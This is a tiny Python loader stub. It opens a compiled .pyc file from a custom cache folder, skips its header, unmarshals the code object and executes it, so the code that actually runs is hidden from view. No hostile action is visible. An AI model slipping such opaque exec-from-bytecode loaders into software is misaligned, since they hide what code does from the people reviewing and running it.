
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'deep_ast_f97a725d08394df887f8881ed9c0d06e.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
